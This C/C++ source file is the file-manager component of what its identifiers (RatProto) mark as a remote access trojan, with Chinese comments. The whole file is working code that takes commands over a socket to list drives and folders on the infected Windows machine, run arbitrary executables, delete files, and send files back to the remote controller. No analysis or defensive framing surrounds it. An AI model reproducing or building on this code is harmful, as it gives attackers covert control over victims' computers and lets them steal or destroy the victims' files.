#include "FileMgr.h"

//////////////////////////////////////////////////////////////////////////
//打开指定文件
//////////////////////////////////////////////////////////////////////////
BOOL FileOpen(SOCKET sockfd,int dwSize)
{
	char* szPath = szRecvCmd+sizeof(RatProto);
	FileList(sockfd,szPath);
	szPath[strlen(szPath)-1] = '\0';

	RatProto ratPro;
	ratPro.RatId = FILE_REPLY;
	ratPro.RatLen = sizeof(RatProto)+MAX_PATH;
	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));
	SendCmd(sockfd,szPath,MAX_PATH);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//执行EXE文件
//////////////////////////////////////////////////////////////////////////
BOOL FileExcute(SOCKET sockfd,int dwSize)
{
	char* szPath = szRecvCmd+sizeof(RatProto);
	ShellExecute(NULL,"open",szPath,NULL,NULL,SW_SHOWNORMAL);


	for (int i=strlen(szPath)-1;i>0;i--)
	{
		if (szPath[i]=='\\')
		{
			break;
		}
		else
		{
			szPath[i] = '\0';
		}
	}
	char szMsg[] = "执行成功！";
	RatProto ratPro;
	ratPro.RatId = FILE_REPLY;
	ratPro.RatLen = sizeof(RatProto)+MAX_PATH+strlen(szMsg)+1;
	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));
	SendCmd(sockfd,szPath,MAX_PATH);
	SendCmd(sockfd,szMsg,strlen(szMsg)+1);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//文件夹回溯
//////////////////////////////////////////////////////////////////////////
BOOL FileBack(SOCKET sockfd,int dwSize)
{
	char* szPath = szRecvCmd+sizeof(RatProto);
	if (strlen(szPath)==3)
	{
		DriveList(sockfd);
		return TRUE;
	}
	for (int i=strlen(szPath)-2;i>0;i--)
	{
		if (szPath[i]=='\\')
		{
			szPath[i+1] = '*';
			break;
		}
		else
		{
			szPath[i] = '\0';
		}
	}
	FileList(sockfd,szPath);

	RatProto ratPro;
	ratPro.RatId = FILE_REPLY;
	ratPro.RatLen = sizeof(RatProto)+MAX_PATH;
	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));
	szPath[strlen(szPath)-1] = '\0';
	SendCmd(sockfd,szPath,MAX_PATH);

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//删除文件
//////////////////////////////////////////////////////////////////////////
BOOL FileDelete(SOCKET sockfd,int dwSize)
{
	char* szPath = szRecvCmd+sizeof(RatProto);
	BOOL bRet = DeleteFile(szPath);
	char szMsg[] = "删除成功！";
	if (bRet)
	{
		Sleep(100);
		for (int i=strlen(szPath);i>0;i--)
		{
			if (szPath[i] == '\\')
			{
				szPath[i+1] = '*';
				szPath[i+2] = '\0';
				break;
			}
		}
		FileList(sockfd,szPath);
		szPath[strlen(szPath)-1] = '\0'; 
	}
	else
	{
		for (int i=strlen(szPath)-1;i>0;i--)
		{
			if (szPath[i]=='\\')
			{
				break;
			}
			else
			{
				szPath[i] = '\0';
			}
		}
		sprintf(szMsg,"%s","删除失败！");
	}

	RatProto ratPro;
	ratPro.RatId = FILE_REPLY;
	ratPro.RatLen = sizeof(RatProto)+MAX_PATH+strlen(szMsg)+1;
	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));
	SendCmd(sockfd,szPath,MAX_PATH);
	SendCmd(sockfd,szMsg,strlen(szMsg)+1);

	return TRUE;
}



//////////////////////////////////////////////////////////////////////////
//列目录文件
//////////////////////////////////////////////////////////////////////////
BOOL FileList(SOCKET sockfd,char* szPath)
{
	int dwSize = sizeof(RatProto)+sizeof(FileInfo)*FILENUMS;
	char* pData = (char*)malloc(dwSize);
	FileInfo* pFi = (FileInfo*)(pData+sizeof(RatProto));
	int dwCount = 0;
	if (pData)
	{
		WIN32_FIND_DATA wfa;
		HANDLE hFind = FindFirstFile(szPath,&wfa);
		if (hFind!=INVALID_HANDLE_VALUE)
		{
			do 
			{
				if (wfa.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY)
				{
					pFi->Type = 0;
				}
				else
				{
					pFi->Type = 1;
				}
				int dwIndex = strlen(wfa.cFileName);
				if (wfa.cFileName[dwIndex-1] == 'e' && wfa.cFileName[dwIndex-2]=='x' && wfa.cFileName[dwIndex-3]=='e' && wfa.cFileName[dwIndex-4]=='.')
				{
					pFi->Type = 3;
				}
				memset(pFi->Name,0,NAMESIZE);
				sprintf(pFi->Name,"%s",wfa.cFileName);
				pFi++;
				dwCount++;
				if (dwCount>=FILENUMS)
				{
					break;
				}
			} while (FindNextFile(hFind,&wfa));
		}
	}
	((RatProto*)pData)->RatId = FILE_VIEW;
	((RatProto*)pData)->RatLen = dwSize =  sizeof(RatProto)+sizeof(FileInfo)*dwCount;
	SendCmd(sockfd,pData,dwSize);
	free(pData);

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//列盘符
//////////////////////////////////////////////////////////////////////////
BOOL DriveList(SOCKET sockfd)
{
	int dwSize = sizeof(RatProto)+sizeof(FileInfo)*26;
	int dwCount = 0;
	char* pData = (char*)malloc(dwSize);
	FileInfo* pFi = (FileInfo*)(pData+sizeof(RatProto));
	if (pData)
	{
		char szDriver[] = "C:\\";
		for (int i=0;i<26;i++)
		{
			unsigned int nRet = GetDriveType(szDriver);
			if (nRet==DRIVE_FIXED || nRet==DRIVE_REMOVABLE || nRet==DRIVE_REMOTE)
			{
				dwCount++;
				pFi->Type = 2;
				sprintf(pFi->Name,"%s",szDriver);
				pFi++;
			}
			szDriver[0]++;
		}
	}

	dwSize = sizeof(RatProto)+sizeof(FileInfo)*dwCount;
	((RatProto*)pData)->RatId = FILE_VIEW;
	((RatProto*)pData)->RatLen = dwSize;
	SendCmd(sockfd,pData,dwSize);
	free(pData);


	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//下载文件
//////////////////////////////////////////////////////////////////////////
BOOL FileDownload(SOCKET sockfd,int dwSize)
{
	RatProto ratPro;
	ratPro.RatId = FILE_TRANSMIT;
	char* szPath = szRecvCmd+sizeof(RatProto);
	HANDLE hFile = CreateFile(szPath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,NULL,NULL);
	for (int i=strlen(szPath)-1;i>0;i--)
	{
		if (szPath[i]=='\\')
		{
			break;
		}
		else
		{
			szPath[i] ='\0';
		}
	}
	if (hFile==INVALID_HANDLE_VALUE)
	{
		ratPro.RatCsm = -1;
		SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));
		return FALSE;
	}
	else
	{
		ratPro.RatCsm = GetFileSize(hFile,NULL);
	}
	ratPro.RatLen = sizeof(RatProto);
	TRANSMIT_FILE_BUFFERS tfb;
	tfb.Head = &ratPro;
	tfb.HeadLength = sizeof(RatProto);
	tfb.TailLength = 0;
	char szMsg[] = "下载成功！";
	BOOL bRet = TransmitFile(sockfd,hFile,NULL,PERSENDBYTES,NULL,&tfb,NULL);
	if (!bRet)
	{
		sprintf(szMsg,"%s","下载失败!");
	}
	ratPro.RatId = FILE_REPLY;
	ratPro.RatLen = sizeof(RatProto)+MAX_PATH+strlen(szMsg)+1;
	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));
	SendCmd(sockfd,szPath,MAX_PATH);
	SendCmd(sockfd,szMsg,strlen(szMsg)+1);


	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//传输文件线程函数
//////////////////////////////////////////////////////////////////////////
void FileTransmit(LPVOID fa)
{
	FileArgs* farg = (FileArgs*)fa;
	RatProto ratPro;
	ratPro.RatId = FILE_TRANSMIT;
	ratPro.RatCsm = GetFileSize(farg->hFile,NULL);
	ratPro.RatLen = sizeof(RatProto);
	TRANSMIT_FILE_BUFFERS tfb;
	tfb.Head = &ratPro;
	tfb.HeadLength = sizeof(RatProto);
	tfb.TailLength = 0;

	BOOL bRet = TransmitFile(farg->sockfd,farg->hFile,NULL,PERSENDBYTES,NULL,&tfb,NULL);

	if (!bRet)
	{
		int nRet = WSAGetLastError();
		char temp[10];
		sprintf(temp,"%d",nRet);
		MessageBox(NULL,temp,NULL,NULL);
	}

	CloseHandle(farg->hFile);
}